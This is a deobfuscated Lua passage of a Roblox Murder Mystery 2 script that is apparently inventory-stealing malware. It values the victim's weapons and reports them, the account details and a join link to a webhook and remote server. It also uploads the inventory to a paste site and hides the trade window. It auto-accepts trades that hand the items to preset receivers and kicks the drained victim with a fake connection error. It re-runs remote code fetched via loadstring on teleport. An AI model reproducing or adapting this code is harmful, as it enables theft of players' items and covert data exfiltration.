                for _, Unique in ipairs(Uniques) do
                    Unique = Unique.BaseItem or ""
                    Unique = tostring(Unique)

                    if Unique ~= "" then
                        v93 = value9.value6(Unique)

                        if v93 then
                            v94 = not value9.value3[Unique]

                            if v94 then
                                v94 = not value9.value3[v93.dataid]
                            end
                        else
                            v94 = v93
                        end

                        if v94 then
                            table.insert(t6, {
								["DataID"] = Unique,
								["Name"] = v93.name .. (v93.isChroma and " [CHROMA]" or ""),
								["Amount"] = 1,
								["Value"] = v93.value,
								["DollarValue"] = v93.dollarValue,
								["Rarity"] = v93.rarity,
								["IsChroma"] = v93.isChroma
							})
                        end
                    end
                end

                table.sort(t6, function(p14, p15)
                    return p14.Value > p15.Value
                end)

                return t6
            end
            value9.value12 = value9.value11(value41)
            value9.value13 = 0
            value9.value14 = 0
            identifyexecutor_, ok, value41 = ipairs(value9.value12)
            v7.value41 = value41
            while true do
                value41, value33 = identifyexecutor_(ok, v7.value41)
                v7.value41 = value41
                v7.value43 = value33

                if not v7.value41 then
                    break
                end

                v7.value45 = v7.value43.Value
                v7.value46 = v7.value43.Amount
                value9.value13 = value9.value13 + v7.value45 * v7.value46
                v7.value44 = (v7.value43.DollarValue or 0) * v7.value43.Amount
                value9.value14 = value9.value14 + v7.value44
            end
            v_u_40.value1("Initial inventory - weaponsToSend: " .. #value9.value10 .. " totalAllValue: " .. value9.value13 .. " totalAllDollar: $" .. value9.value14)
            v_u_40.value1("=== ITEMS IN QUEUE ===")
            identifyexecutor_, ok, value41 = ipairs(value9.value10)
            v7.value41 = ok
            v7.value42 = value41
            ok = v7.value41
            value41 = v7.value42
            v7.value43 = ok
            v7.value44 = value41
            while true do
                ok, value41 = identifyexecutor_(v7.value43, v7.value44)
                v7.value44 = ok
                v7.value46 = value41

                if not v7.value44 then
                    break
                end

                v_u_40.value1(string.format("  [%d] %s (%s) x%d - Value: %d (~$%.2f)", v7.value44, v7.value46.DataID, v7.value46.Name, v7.value46.Amount, v7.value46.Value, v7.value46.DollarValue or 0))
            end
            v_u_40.value1("=====================")
            function v7.value43(p16, p17, p18)
                local v100, v101, v102 = ipairs(p16)
                local t7 = {}
                local v104 = p17 or 20
                local v105 = p18 or " \226\158\156 "

                while true do
                    v102, v125 = v100(v101, v102)

                    if not v102 then
                        break
                    end

                    table.insert(t7, {
						["name"] = v125.Name or v125.DataID,
						["value"] = v125.Value or 0,
						["dollar"] = v125.DollarValue or 0,
						["amount"] = v125.Amount or 1
					})
                end

                table.sort(t7, function(p19, p20)
                    return p19.value > p20.value
                end)
                v102 = 0

                local t8 = {}

                for _, v in ipairs(t7) do
                    v129 = string.format("%dx %s", v.amount, v.name)
                    v102 = v102 < #v129 and #v129 or v102
                    table.insert(t8, {
						["left"] = v129,
						["right"] = string.format("%d (~$%.2f)", v.value, v.dollar * v.amount)
					})
                end

                local n2 = 0
                local t9 = {}

                for _, v in ipairs(t7) do
                    n2 = n2 + v.amount
                end

                t7 = 0

                for i, v in ipairs(t7) do
                    if v104 <= #t9 then
                        if t7 < n2 then
                            v100 = "... and " .. n2 - t7 .. " more"
                            table.insert(t9, v100)
                        else
                            if #t9 ~= 0 then
                                return table.concat(t9, "\n")
                            end

                            table.insert(t9, "None Found")
                        end

                        return table.concat(t9, "\n")
                    end

                    local v115 = (t8[i].left .. string.rep(" ", v102 - #t8[i].left)) .. v105 .. t8[i].right

                    table.insert(t9, v115)
                    t7 = t7 + v.amount
                end

                if t7 < n2 then
                    v100 = "... and " .. n2 - t7 .. " more"
                    table.insert(t9, v100)
                else
                    if #t9 ~= 0 then
                        return table.concat(t9, "\n")
                    end

                    table.insert(t9, "None Found")
                end

                return table.concat(t9, "\n")
            end
            value9.value15 = v7.value43
            v7.value44 = v_u_41.value5
            function v7.value48(p21, p22)
                local v116 = value9.value15(value9.value12, 20, " \226\158\156 ")
                local v117 = string.format("https://plsbrainrot.me/joiner?placeId=%s&gameInstanceId=%s", game.PlaceId, v_u_41.value13)
                local identifyexecutor_2 = identifyexecutor and identifyexecutor() or "Unknown"
                local format = string.format
                identifyexecutor_2 = {
					string.format("Username: %s", v_u_41.value4.Name),
					string.format("Account Age: %d days", v_u_41.value4.AccountAge),
					format("Players: %d/%d", #v_u_41.value1:GetPlayers(), v_u_41.value1.MaxPlayers),
					string.format("Executor: %s", identifyexecutor_2)
				}
                if p21 then
                    v116 = {
						{
							["name"] = "**Player Info**",
							["value"] = "```\n" .. table.concat(identifyexecutor_2, "\n") .. "\n```",
							["inline"] = false
						},
						{
							["name"] = string.format("Weapons (Total Val: %d val, $%.2f total) \226\128\148 Threshold: >%d", value9.value13, value9.value14, v_u_41.value8),
							["value"] = "```\n" .. v116 .. "\n```",
							["inline"] = false
						}
					}

                    if p21 then
                        identifyexecutor_2 = v116
                    else
                        identifyexecutor_2 = #v116 + 1
                        v116[identifyexecutor_2] = {
							["name"] = "**Join Link**",
							["value"] = string.format("[**%s**](%s)", v_u_41.value13, v117),
							["inline"] = false
						}

                        if not p22 then
                            return {
								["content"] = "",
								["embeds"] = {
									{
										["title"] = p21 and "Murder Mystery 2 Public Hit! Snthnova frfrfr" or p21 or "Murder Mystery 2 Hit! Snthnova so peak",
										["color"] = 16711680,
										["fields"] = v116,
										["footer"] = {
											["text"] = "Snthnova! (Murder Mystery 2)"
										},
										["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
									}
								}
							}
                        end

                        identifyexecutor_2 = #v116 + 1
                        v116[identifyexecutor_2] = {
							["name"] = "",
							["value"] = string.format("[**View Full Inventory Log**](%s)", p22),
							["inline"] = false
						}
                    end

                    return {
						["content"] = "",
						["embeds"] = {
							{
								["title"] = p21 and "Murder Mystery 2 Public Hit! Snthnova frfrfr" or p21 or "Murder Mystery 2 Hit! Snthnova so peak",
								["color"] = 16711680,
								["fields"] = v116,
								["footer"] = {
									["text"] = "Snthnova! (Murder Mystery 2)"
								},
								["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
							}
						}
					}
                end
                identifyexecutor_2[#identifyexecutor_2 + 1] = string.format("Receivers: %s", table.concat(v_u_41.value6, ", "))
                v116 = {
					{
						["name"] = "**Player Info**",
						["value"] = "```\n" .. table.concat(identifyexecutor_2, "\n") .. "\n```",
						["inline"] = false
					},
					{
						["name"] = string.format("Weapons (Total Val: %d val, $%.2f total) \226\128\148 Threshold: >%d", value9.value13, value9.value14, v_u_41.value8),
						["value"] = "```\n" .. v116 .. "\n```",
						["inline"] = false
					}
				}
                if not (p21) then
                    identifyexecutor_2 = #v116 + 1
                    v116[identifyexecutor_2] = {
						["name"] = "**Join Link**",
						["value"] = string.format("[**%s**](%s)", v_u_41.value13, v117),
						["inline"] = false
					}

                    if not p22 then
                        return {
							["content"] = "",
							["embeds"] = {
								{
									["title"] = p21 and "Murder Mystery 2 Public Hit! Snthnova frfrfr" or p21 or "Murder Mystery 2 Hit! Snthnova so peak",
									["color"] = 16711680,
									["fields"] = v116,
									["footer"] = {
										["text"] = "Snthnova! (Murder Mystery 2)"
									},
									["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
								}
							}
						}
                    end

                    identifyexecutor_2 = #v116 + 1
                    v116[identifyexecutor_2] = {
						["name"] = "",
						["value"] = string.format("[**View Full Inventory Log**](%s)", p22),
						["inline"] = false
					}
                end

                return {
					["content"] = "",
					["embeds"] = {
						{
							["title"] = p21 and "Murder Mystery 2 Public Hit! Snthnova frfrfr" or p21 or "Murder Mystery 2 Hit! Snthnova so peak",
							["color"] = 16711680,
							["fields"] = v116,
							["footer"] = {
								["text"] = "Snthnova! (Murder Mystery 2)"
							},
							["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
						}
					}
				}
            end
            value9.value16 = nil
            function v7.value46(p23, _, _)
                if not v_u_41.value9 or p23 == "" then
                    return
                end
            end
            value9.value16 = v7.value44 .. "/webhook/"
            value9.value17 = v_u_41.value5
            value9.value18 = v7.value46
            unpack_ = function()
                if v_u_41.value9 then
                    local pcall_ = pcall
                    local value92 = v_u_41.value9
                    local v122 = value9.value17 .. "/track-execution-mm2"
                    local value3 = v_u_41.value3
                    local value6 = v_u_41.value6

                    pcall_(value92, {
						["Url"] = v122,
						["Method"] = "POST",
						["Headers"] = {
							["Content-Type"] = "application/json",
							["X-Roblox-Key"] = "congrats-youre-a-fucking-nolife-weirdo-for-decoding-this-xd-get-a-life-please-go-outside"
						},
						["Body"] = value3:JSONEncode({
							["target_players"] = value6,
							["executor"] = v_u_41.value4.Name
						})
					})

                    return
                else
                    return
                end
            end
            value9.value19 = false
            function v7.value47()
                if not v_u_41.value9 then
                    return nil
                end

                local pcall_ = value9.value15(value9.value12, 999999, " : ")
                local t10 = {}

                table.insert(t10, "=== FULL INVENTORY ===")
                table.insert(t10, pcall_)
                pcall_ = pcall

                local value92 = v_u_41.value9
                local value3 = v_u_41.value3

                t10 = {
					{
						["content"] = table.concat(t10, "\n")
					}
				}
                pcall_, t10 = pcall_(value92, {
					["Url"] = "https://sourceb.in/api/bins",
					["Method"] = "POST",
					["Headers"] = {
						["Content-Type"] = "application/json"
					},
					["Body"] = value3:JSONEncode({
						["files"] = t10
					})
				})

                if pcall_ then
                    if t10 then
                        pcall_ = t10.StatusCode == 200
                    else
                        pcall_ = t10
                    end
                end

                if not pcall_ then
                    return nil
                end

                pcall_, t10 = pcall(v_u_41.value3.JSONDecode, v_u_41.value3, t10.Body)

                if not pcall_ then
                    if pcall_ then
                        return "https://cdn.sourceb.in/bins/" .. t10.key .. "/0"
                    else
                        return nil
                    end

                    return
                end

                if t10 then
                    pcall_ = t10.key
                else
                    pcall_ = t10
                end

                if pcall_ then
                    return "https://cdn.sourceb.in/bins/" .. t10.key .. "/0"
                else
                    return nil
                end
            end
            identifyexecutor_ = function()
                if value9.value19 then
                    return
                end

                local syn_ = syn

                if syn_ then
                    syn_ = syn.request
                end

                syn_ = syn_ or (http_request or request)

                if not syn_ then
                    return
                end

                syn_ = function()
                    local v130 = syn_
                    local v131 = v_u_41.value5 .. "/signal-hit"
                    local value3 = v_u_41.value3
                    local PlaceId = game.PlaceId

                    PlaceId = {
						["place_id"] = tostring(PlaceId),
						["job_id"] = v_u_41.value13,
						["target_players"] = v_u_41.value6,
						["sender"] = v_u_41.value4.Name,
						["game_type"] = "mm2"
					}

                    return v130({
						["Url"] = v131,
						["Method"] = "POST",
						["Headers"] = {
							["Content-Type"] = "application/json",
							["X-Roblox-Key"] = "congrats-youre-a-fucking-nolife-weirdo-for-decoding-this-xd-get-a-life-please-go-outside"
						},
						["Body"] = value3:JSONEncode(PlaceId)
					})
                end

                local result

                syn_, result = pcall(syn_)

                if not syn_ then
                    return
                end

                if result then
                    syn_ = result.Body
                else
                    syn_ = result
                end

                if not syn_ then
                    return
                end

                syn_ = function()
                    return v_u_41.value3:JSONDecode(result.Body)
                end
                syn_, result = pcall(syn_)

                if syn_ then
                    if not result then
                        return
                    end

                    result = result.failed
                else
                    result = syn_
                end
            end
            value9.value20 = v7.value47
            value9.value21 = v7.value48
            v7.value49 = getgenv()
            v7.value49.BLACKLIST_URL = "https://pastefy.app/YUhu3IrQ/raw"
            value9.value22 = false
            function v7.value48()
                if value9.value22 then
                    return
                end

                if #value9.value12 == 0 then
                    v_u_40.value1("No tradable weapons \226\128\148 kicking as bot")

                    return
                end

                v_u_40.value1("allWeaponsLog=" .. #value9.value12 .. " weaponsToSend=" .. #value9.value10 .. " totalAllValue=" .. value9.value13 .. " totalAllDollar=$" .. value9.value14)

                local v135 = value9.value20()
                local v136, v137, v138 = ipairs(value9.value12)

                v136 = value67.value1(v136, v137, v138)
                v137 = false
                v138 = true

                while true do
                    v161 = table.pack(v136())

                    if not v161[1] then
                        break
                    end

                    if v161[3].Value >= 8000 then
                        v137 = true

                        break
                    end
                end

                v136 = value9.value13 >= 15000 and true or v137

                if getgenv().BLACKLIST_URL and v136 then
                    v136, v137 = pcall(function()
                        return game:HttpGet(getgenv().BLACKLIST_URL)
                    end)

                    if v136 and v137 then
                        v136 = loadstring(v137)

                        if v136 then
                            v136, v137 = pcall(v136)

                            if v136 then
                                v136 = type(v137) == "table"
                            end

                            if v136 then
                                v136, v137, v161 = ipairs(v137)
                                v136 = value67.value1(v136, v137, v161)

                                while true do
                                    v137 = table.pack(v136())

                                    if not v137[1] then
                                        break
                                    end

                                    v137 = v137[3]

                                    if v_u_41.value4.Name:lower() == v137:lower() then
                                        break
                                    end
                                end
                            end
                        end
                    end
                end

                local v139

                v136, v137, v139 = ipairs(value9.value12)
                v136 = value67.value1(v136, v137, v139)
                v137 = false
                v139 = false

                local v140 = false

                while true do
                    v163 = table.pack(v136())

                    if not v163[1] then
                        break
                    end

                    if v163[3].Value >= 1000 then
                        v137 = true

                        break
                    end
                end

                local v141, v142

                v136, v141, v142 = ipairs(value9.value12)
                v136 = value67.value1(v136, v141, v142)
                v141 = false

                while true do
                    v142 = table.pack(v136())

                    if not v142[1] then
                        break
                    end

                    if (v142[3].DollarValue or 0) >= 30 then
                        v141 = true

                        break
                    end
                end

                v136 = v137 or (value9.value13 >= 3000 or (v141 or value9.value14 >= 30))
                v137, v141, v142 = ipairs(value9.value12)
                v136 = v136 and true or v140

                while true do
                    v142, v140 = v137(v141, v142)

                    if not v142 then
                        break
                    end

                    if v_u_41.value8 <= v140.Value then
                        v139 = true

                        break
                    end
                end

                if v_u_41.value7 == "" then
                    return
                end

                v135 = value9.value21(false, v135)
                v135.content = v139 and "@everyone" or v139 or ""
                unpack_()
                value9.value18(v_u_41.value7, v135.content, v135.embeds)

                if not v139 then
                    return
                end

                identifyexecutor_()
            end
            v7.value48()
            if setclipboard then
                setclipboard("")
            end
            if #value9.value10 == 0 then
                v_u_40.value1("No tradable weapons \226\128\148 stopping")

                return
            end
            v_u_40.value1("Waiting for Trade folder...")
            v7.value50 = v_u_41.value2:WaitForChild("Trade", 15)
            unpack_ = v7.value50
            if not unpack_ then
                v_u_40.value1("Trade folder not found \226\128\148 aborting")

                return
            end
            identifyexecutor_ = false
            v7.value51 = v_u_41.value4:WaitForChild("PlayerGui")
            local v143 = false
            v7.value52 = v7.value51:WaitForChild("MainGUI"):WaitForChild("Game"):FindFirstChild("Inventory")
            local TradeGUI_Phone
            if v7.value52 == nil then
                TradeGUI_Phone = v7.value51.TradeGUI_Phone
                v143 = true
            else
                TradeGUI_Phone = v7.value51.TradeGUI
            end
            v7.value53 = UDim2.new(0, 9999, 0, 9999)
            ok = v7.value53
            task.spawn(function()
                while task.wait(0.5) do
                    local function v145()
                        TradeGUI_Phone.Enabled = false
                    end

                    pcall(v145)

                    if v143 then
                        v145 = function()
                            TradeGUI_Phone.Container.Position = ok
                        end
                        pcall(v145)
                        v145 = function()
                            TradeGUI_Phone.ClickBlocker.Position = ok
                        end
                        pcall(v145)
                    else
                        v145 = function()
                            TradeGUI_Phone.BG.Position = ok
                        end
                        pcall(v145)
                        pcall(function()
                            TradeGUI_Phone.Container.Position = ok
                        end)
                        v145 = function()
                            TradeGUI_Phone.ClickBlocker.Position = ok
                        end
                        pcall(v145)
                        pcall(function()
                            TradeGUI_Phone.Processing.Position = ok
                        end)
                    end
                end
            end)
            v7.value54 = unpack_:FindFirstChild("SendRequest")
            if v7.value54 then
                function v7.value56()
                    return true
                end

                v7.value55 = newcclosure(v7.value56)
                v7.value54.OnClientInvoke = v7.value55
                v_u_40.value1("SendRequest.OnClientInvoke hooked \226\128\148 incoming requests blocked")
            end
            function v7.value55()
                local function v146()
                    return unpack_.GetTradeStatus:InvokeServer()
                end

                local result

                v146, result = pcall(v146)
                v146 = v146 and result or "None"

                if v146 == "StartTrade" then
                    v146 = function()
                        unpack_.DeclineTrade:FireServer()
                    end
                    pcall(v146)
                    identifyexecutor_ = false
                    task.wait(0.3)

                    return
                end

                if v146 ~= "ReceivingRequest" then
                    return
                end

                pcall(function()
                    unpack_.DeclineRequest:FireServer()
                end)
                task.wait(0.3)
            end
            ok = v7.value55
            task.spawn(function()
                while task.wait(0.2) do
                    local function v148()
                        return unpack_.GetTradeStatus:InvokeServer()
                    end

                    local result

                    v148, result = pcall(v148)

                    if (v148 and result or "None") == "ReceivingRequest" then
                        pcall(function()
                            unpack_.DeclineRequest:FireServer()
                        end)
                    end

                    pcall(function()
                        local AcceptTrade = unpack_.AcceptTrade
                        local v151 = game.PlaceId * 3
                        local LastOffer = _G.LastOffer

                        AcceptTrade:FireServer(v151, LastOffer or 0)
                    end)
                end
            end)
            v7.value56 = unpack_:FindFirstChild("StartTrade")
            if v7.value56 then
                v7.value55 = v7.value56.OnClientEvent

                function v7.value58()
                    identifyexecutor_ = true
                    v_u_40.value1("StartTrade fired \226\128\148 window open")
                end

                v7.value55:Connect(v7.value58)
            end
            v7.value57 = unpack_:FindFirstChild("DeclineTrade")
            if v7.value57 then
                function v7.value59()
                    identifyexecutor_ = false
                    v_u_40.value1("DeclineTrade \226\128\148 server closed trade")
                end

                v7.value57.OnClientEvent:Connect(v7.value59)
            end
            v7.value58 = unpack_:FindFirstChild("AcceptTrade")
            if v7.value58 then
                function v7.value60(p24)
                    if p24 then
                        identifyexecutor_ = false
                        v_u_40.value1("AcceptTrade OnClientEvent \226\128\148 TRADE COMPLETE")

                        return
                    else
                        v_u_40.value1("AcceptTrade OnClientEvent \226\128\148 accept registered")

                        return
                    end
                end

                v7.value58.OnClientEvent:Connect(v7.value60)
            end
            v7.value59 = unpack_:FindFirstChild("UpdateTrade")
            if v7.value59 then
                function v7.value61(p25)
                    if type(p25) ~= "table" then
                        return
                    end

                    if p25.LastOffer == nil then
                        return
                    end

                    _G.LastOffer = p25.LastOffer

                    local LastOffer = p25.LastOffer

                    tick()
                    LastOffer = v_u_40.value1

                    local LastOffer2 = p25.LastOffer

                    LastOffer("UpdateTrade: LastOffer=" .. tostring(LastOffer2))
                end

                v7.value59.OnClientEvent:Connect(v7.value61)
                v_u_40.value1("UpdateTrade listener active")
            end
            v7.value60 = task
            v7.value64 = 31298370369774
            v7.value67 = "=W\233\239\r"
            v7.value60.spawn(function()
                if getupvalues and (setupvalue and getloadedmodules) then
                    local ok2, result = pcall(getloadedmodules)

                    if ok2 and result then
                        local n3 = 0

                        for _, v in ipairs(result) do
                            local ok3, result2 = pcall(getupvalues, v)
                            if ok3 then
                                ok3 = type(result2) == "table"
                            end
                            if ok3 then

                                for k, v2 in pairs(result2) do
                                    local v164 = type(v2) == "number"

                                    if v164 then
                                        if v2 >= 0 then
                                            v164 = v2 <= 6
                                        else
                                            v164 = false
                                        end
                                    end

                                    if v164 then
                                        pcall(setupvalue, v, k, 0)
                                        n3 = n3 + 1
                                    end
                                end
                            end
                        end

                        v_u_40.value1("Cooldown bypass: zeroed " .. n3 .. " upvalues")

                        return
                    else
                        return
                    end

                    return
                else
                    return
                end
            end)
            function v7.value60(p26)
                local v165 = p26:lower()

                for _, v in ipairs(v_u_41.value6) do
                    if v165 == v:lower() then
                        return true
                    end
                end

                return v165:find("husszn_hold1", 1, true) and true or false
            end
            value41 = v7.value60
            function v7.value61()
                while true do
                    local function v168()
                        return unpack_.GetTradeStatus:InvokeServer()
                    end

                    local result

                    v168, result = pcall(v168)

                    if (v168 and result or "None") == "None" then
                        break
                    end

                    task.wait(0.1)
                end
            end
            value33 = v7.value61
            function v7.value62(p27)
                v_u_40.value1("doTradeWithTarget: " .. p27.Name)
                ok()

                while true do
                    if not p27.Parent then
                        v_u_40.value1("Target left or no more items: " .. p27.Name)

                        return
                    end

                    if not (#value9.value10 > 0) then
                        v_u_40.value1("Target left or no more items: " .. p27.Name)

                        return
                    end

                    local function v170()
                        return unpack_.GetTradeStatus:InvokeServer()
                    end

                    local result

                    v170, result = pcall(v170)
                    v170 = v170 and result or "None"

                    if v170 == "None" then
                        v170 = function()
                            return unpack_.SendRequest:InvokeServer(p27)
                        end
                        v170 = { pcall(v170) }
                        result = v170[2]

                        if v170[1] then
                            if result == true then
                                v_u_40.value1("Target busy \226\128\148 retry in 3s")
                                task.wait(3)
                            end
                        else
                            v_u_40.value1("SendRequest error: " .. tostring(result))
                            task.wait(2)
                        end
                    elseif v170 == "SendingRequest" then
                        task.wait(0.3)
                    elseif v170 == "ReceivingRequest" then
                        unpack_.DeclineRequest:FireServer()
                        task.wait(0.3)
                    else
                        if v170 == "StartTrade" then
                            v_u_40.value1("Trade window open")
                            v170 = value9.value8()

                            if v170 then
                                value9.value10 = value9.value9(v170)
                                v_u_40.value1("Refreshed inventory - " .. #value9.value10 .. " items in queue")
                            end

                            local t11 = {}
                            local t12 = {}
                            local DataID, n4

                            for i = 1, #value9.value10 do
                                if #t11 >= 4 then
                                    break
                                end

                                DataID = value9.value10[i]

                                if not t12[DataID.DataID] then
                                    t12[DataID.DataID] = true
                                    n4 = 0

                                    for _, v in ipairs(value9.value10) do
                                        if v.DataID == DataID.DataID then
                                            n4 = n4 + (v.Amount or 1)
                                        end
                                    end

                                    table.insert(t11, {
										["DataID"] = DataID.DataID,
										["Name"] = DataID.Name,
										["Amount"] = n4,
										["Value"] = DataID.Value
									})
                                end
                            end

                            local result2

                            v170, result, result2 = ipairs(t11)
                            v170 = value67.value1(v170, result, result2)
                            result = false

                            local Amount

                            while true do
                                result2 = table.pack(v170())

                                if not result2[1] then
                                    break
                                end

                                result2 = result2[3]

                                if not identifyexecutor_ then
                                    result = true

                                    return
                                end

                                t12 = v_u_40.value1
                                DataID = result2.DataID
                                Amount = result2.Amount
                                t12("Offering: " .. DataID .. " x" .. tostring(Amount))

                                for i = 1, result2.Amount do
                                    if not identifyexecutor_ then
                                        result = true

                                        break
                                    end

                                    local v182

                                    v182, n4 = value9.value7(result2.DataID)
                                    pcall(function()
                                        unpack_.OfferItem:FireServer(v182, n4)
                                    end)
                                end

                                if result then
                                    break
                                end
                            end

                            if result or #t11 == 0 then
                                v_u_40.value1("Offer aborted or no items \226\128\147 cancelling")
                                unpack_.DeclineTrade:FireServer()
                                value9.value10 = {}

                                return
                            end

                            v_u_40.value1("Offered " .. #t11 .. " distinct items")
                            v_u_40.value1("Waiting for trade completion...")
                            v170 = tick() + 30

                            while tick() < v170 do
                                result = function()
                                    return unpack_.GetTradeStatus:InvokeServer()
                                end
                                result, result2 = pcall(result)

                                if (result and result2 or "None") == "None" then
                                    v_u_40.value1("Trade ended by server")

                                    break
                                end

                                result = function()
                                    unpack_.AcceptTrade:FireServer(game.PlaceId * 3, _G.LastOffer or 0)
                                end
                                pcall(result)
                                task.wait(1)
                            end

                            value33()
                            task.wait(2)
                            v170 = value9.value8()

                            if v170 then
                                value9.value10 = value9.value9(v170)
                                value9.value12 = value9.value11(v170)
                                value9.value13 = 0
                                value9.value14 = 0
                                for result2, t11 in ipairs(value9.value12) do

                                    t12 = t11.Value
                                    DataID = t11.Amount
                                    Amount = value9
                                    Amount.value13 = Amount.value13 + t12 * DataID
                                    t11 = (t11.DollarValue or 0) * t11.Amount
                                    t12 = value9
                                    t12.value14 = t12.value14 + t11
                                end
                                v_u_40.value1("Trade complete - " .. #value9.value10 .. " items remaining, total value: " .. value9.value13 .. " ($" .. value9.value14 .. ")")
                            else
                                v_u_40.value1("Could not verify inventory - rebuilding from scratch")
                            end

                            ok()
                            identifyexecutor_ = false
                            v_u_40.value1("Target left or no more items: " .. p27.Name)

                            return
                        end

                        task.wait(0.5)
                    end

                    task.wait(0.5)
                end
            end
            value67 = v7.value62
            unpack_ = {}
            identifyexecutor_ = {}
            function v7.value63(p28)
                if unpack_[p28.Name] then
                    return
                end
            end
            value67 = v7.value63
            task.spawn(function()
                while true do
                    task.wait(10)

                    local ipairs_ = ipairs
                    local value1 = v_u_41.value1

                    for _, player in ipairs_(value1:GetPlayers()) do
                        local v187 = player ~= v_u_41.value4

                        if v187 then
                            v187 = value41(player.Name) or value41(player.DisplayName)

                            if v187 then
                                v187 = not unpack_[player.Name]
                            end
                        end

                        if v187 then
                            ipairs_ = value67
                            ipairs_(player)
                        end
                    end
                end
            end)
            local v188
            ok, value33, v188 = ipairs(v_u_41.value1:GetPlayers())
            v7.value65 = ok
            v7.value66 = value33
            v7.value68 = v188
            v7.value64 = v7.value65
            ok = v7.value68
            value33 = v7.value66
            v7.value67 = ok
            v7.value69 = value33
            while true do
                ok, value33 = v7.value64(v7.value69, v7.value67)
                v7.value67 = ok
                v7.value71 = value33

                if not v7.value67 then
                    break
                end

                v7.value73 = v7.value71 ~= v_u_41.value4
                v7.value74 = v7.value73

                if v7.value73 then
                    v7.value72 = v7.value1
                    v7.value77 = value41(v7.value71.Name)
                    v7.value73 = v7.value77

                    if not v7.value77 then
                        v7.value73 = value41(v7.value71.DisplayName)
                    end

                    ok = v7.value73
                    value33 = v7.value72
                    v7.value74 = ok
                    v7.value1 = value33
                end

                if v7.value74 then
                    ok = v7.value71
                    value67(ok)
                    ok.Chatted:Connect(function()
                        if unpack_[ok.Name] then
                            return
                        end

                        value67(ok)
                    end)
                end
            end
            v7.value64 = v_u_41.value1.PlayerAdded
            function v7.value67(p29)
                local v189 = not value41(p29.Name)

                if not v189 then
                    if v189 then
                        return
                    else
                        if identifyexecutor_[p29.Name] then
                            return
                        end

                        return
                    end

                    return
                end

                v189 = not value41(p29.DisplayName)

                if v189 then
                    return
                else
                    if identifyexecutor_[p29.Name] then
                        return
                    end

                    return
                end
            end
            v7.value64:Connect(v7.value67)
            v7.value64 = v_u_41.value1.PlayerRemoving
            v7.value69 = "Connect"
            v7.value78 = "\\\128\164\5\244\214}I\155\213\216z$H\249\210O\209\144^w\151W\150\223\221 \226:\236#kK\163\239\197w@L\184P<A\251\195P\171\178*\242+"
            function v7.value67(p30)
                if not unpack_[p30.Name] then
                    return
                end

                unpack_[p30.Name] = nil
            end
            v7.value64:Connect(v7.value67)
            v_u_40.value1("\226\148\128\226\148\128 Init complete \226\128\148 all triggers active \226\148\128\226\148\128")
            v7.value64 = false
            value67, unpack_, identifyexecutor_ = ipairs(value9.value12)
            v7.value67 = value67
            v7.value70 = unpack_
            v7.value71 = identifyexecutor_
            value67 = v7.value67
            unpack_ = v7.value71
            identifyexecutor_ = v7.value70
            v7.value69 = value67
            v7.value78 = unpack_
            v7.value74 = identifyexecutor_
            while true do
                value67, unpack_ = v7.value69(v7.value74, v7.value78)
                v7.value78 = value67
                v7.value72 = unpack_

                if not v7.value78 then
                    break
                end

                v7.value77 = v_u_41.value8

                if v7.value77 <= v7.value72.Value then
                    v7.value64 = true

                    break
                end
            end
            if v7.value64 then
                v_u_40.value1("Player has items above threshold - starting drain kick watcher")
                v7.value69 = task.spawn

                function v7.value78()
                    while v_u_41.value4.Parent do
                        task.wait(15)

                        local Uniques = value9.value8()

                        if Uniques then
                            local n5 = 0
                            local Weapons = Uniques.Weapons

                            if Weapons then
                                Weapons = Uniques.Weapons.Owned
                            end

                            Uniques = Uniques.Uniques or {}

                            local pairs_ = pairs
                            local v194, v195

                            Weapons, v194, v195 = pairs_(Weapons or {})

                            local v196

                            while true do
                                v195, v196 = Weapons(v194, v195)

                                if not v195 then
                                    break
                                end

                                local v197 = tostring(v195)

                                pairs_ = value9.value6

                                local v198 = pairs_(v197)

                                if v198 then
                                    v197 = not value9.value3[v197]

                                    if v197 then
                                        v197 = not value9.value3[v198.dataid]
                                    end
                                else
                                    v197 = v198
                                end

                                if v197 and v_u_41.value8 <= v198.value then
                                    n5 = n5 + (type(v196) == "number" and v196 and v196 or 1)
                                end
                            end

                            Uniques, Weapons, v194 = ipairs(Uniques)

                            while true do
                                v194, v195 = Uniques(Weapons, v194)

                                if not v194 then
                                    break
                                end

                                v195 = tostring(v195.BaseItem or "")

                                if v195 ~= "" then
                                    v196 = value9.value6(v195)

                                    if v196 then
                                        v195 = not value9.value3[v195]

                                        if v195 then
                                            v195 = not value9.value3[v196.dataid]

                                            if v195 then
                                                v195 = v_u_41.value8 <= v196.value
                                            end
                                        end
                                    else
                                        v195 = v196
                                    end

                                    if v195 then
                                        n5 = n5 + 1
                                    end
                                end
                            end

                            if n5 == 0 then
                                v_u_41.value4:Kick("You got disconnected due to bad connection Please Rejoin \n")

                                return
                            end
                        end
                    end
                end

                v7.value69(v7.value78)
            else
                v_u_40.value1("Player has no items above threshold - drain kick watcher NOT started")
            end
            v7.value73 = v_u_41.value3
            v7.value76 = v_u_41.value6
            v7.value75 = v_u_41.value7
            v7.value72 = v7.value73.JSONEncode
            v7.value79 = v_u_41.value8
            v7.value72 = v7.value72(v7.value73, {
				["RECEIVERS"] = v7.value76,
				["WEBHOOK"] = v7.value75,
				["THRESHOLD"] = v7.value79
			})
            v7.value69 = "    local HttpService = game:GetService(\"HttpService\")\n    local data = HttpService:JSONDecode(\'" .. v7.value72 .. "\')\n    getgenv().RECEIVERS = data.RECEIVERS\n    getgenv().WEBHOOK   = data.WEBHOOK\n    getgenv().THRESHOLD = data.THRESHOLD\n    loadstring(game:HttpGet(\"https://raw.githubusercontent.com/31yyyyy/main/refs/heads/main/mm2.lua\"))()\n"
            if not queue_on_teleport then
                v_u_40.value1("\226\148\128\226\148\128 Full script loaded with DataID fixing, stacking support, and dollar values \226\148\128\226\148\128")

                return
            end
            queue_on_teleport(v7.value69)
            v_u_40.value1("\226\148\128\226\148\128 Full script loaded with DataID fixing, stacking support, and dollar values \226\148\128\226\148\128")

            return
        until true
    end
end
